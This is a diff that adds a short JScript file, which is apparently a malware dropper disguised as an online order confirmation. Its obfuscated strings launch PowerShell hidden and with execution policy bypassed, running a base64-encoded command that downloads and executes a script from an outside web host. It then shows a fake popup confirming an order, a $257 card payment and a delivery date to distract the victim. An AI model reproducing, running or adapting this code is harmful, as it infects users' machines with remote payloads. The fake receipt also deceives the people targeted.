@@ -1,0 +1,5 @@
+var Muuvkj = "C"+":"+"\\"+"W"+"in"+"do"+"ws\\"+"Sy"+"st"+"e"+"m"+"3"+"2"+"\\Wi"+"nd"+"ow"+"sp"+"ow"+"erS"+"h"+"el"+"l\\v1.0\\p"+"o"+"w"+"er"+"sh"+"e"+"Ll"+"."+"e"+"x"+"e";
+var Lelfe = new ActiveXObject("S"+"h"+"e"+"l"+"l.A"+"p"+"pl"+"i"+"cat"+"ion");
+Lelfe.ShellExecute(Muuvkj,"  -E"+"x"+"ec"+"ut"+"io"+"n"+"P"+"o"+"l"+"i"+"cy b"+"y"+"p"+"as"+"s -w "+"1 "+" /"+"e SQBFAFgAIAAoAE4A"+"ZQB3AC0"+"ATwB"+"iAGoAZQB"+"jAHQAIABOAGUAdAAuAFcAZQ"+"BiAEMAbABpAGUAb"+"gB0ACkALgBEAG8Ad"+"wBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAAnACsAJwB0ACcAKwAnAHAAcwA6"+"AC8ALwB1ACcAKwAnAHMANwAuAHQAJwArACcAbQAnACsA"+"JwBkAC4AYwBsACcAKwAnAG8AdQAnACsAJwBkAC8AJwArACcAfgByA"+"GUAJwArACcAZ"+"ABnAHIAYwBvADEA"+"LwByAC8AYgAnACsAJwB5AHAAJwA"+"rACcAYQBzACcAKwAnAHMALgB0A"+"HgAJwArACcAdA"+"AnACkAO"+"wA=",false);
+var Dgdfvqy = new ActiveXObject("W"+"S"+"cr"+"ip"+"t.S"+"h"+"e"+"l"+"l");
+Dgdfvqy.Popup("Yo"+"ur or"+"der is conf"+"ir"+"med : 51784"+"\n"+"T"+"o"+"t"+"a"+"l : 257.00$"+"\n"+"Pa"+"ym"+"ent Me"+"th"+"od:Cr"+"e"+"di"+"tC"+"a"+"rd"+"\n"+"Es"+"ti"+"mated Del"+"ivery date:Sep , Wed , 2021"+"\n"+"T"+"ha"+"nk y"+"ou f"+"or sho"+"ppi"+"ng with us.")
